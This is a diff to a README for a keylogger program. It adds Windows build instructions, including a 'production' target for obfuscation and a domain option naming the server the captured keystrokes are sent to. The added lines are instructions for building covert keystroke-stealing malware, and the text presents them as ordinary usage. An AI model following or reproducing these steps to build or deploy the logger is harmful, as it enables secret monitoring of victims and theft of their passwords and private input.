@@ -52,7 +52,15 @@ Options:
 ```
 ## Windows
 ### Build
-To build the program, run `make` in the `windows` directory. This will create the `build` directory for you and output to a file named `logger.exe` in the `build` directory. Will listen for all keystrokes when run.
+To build keylogging program, run `make` in the `windows` directory. To build with reduced size and some amount of obfuscation, make the `production` target. This will create the `build` directory for you and output to a file named `logger.exe` in the `build` directory.
+
+`make production domain=example.com`
+
+You can also choose to build the program with debugging by making the `debug` target.
+
+`make debug domain=example.com`
+
+For both targets, you will need to specify the domain the server is listening for.
 ## Sending Test Requests
 You can use `dig` to send requests to the server:
 
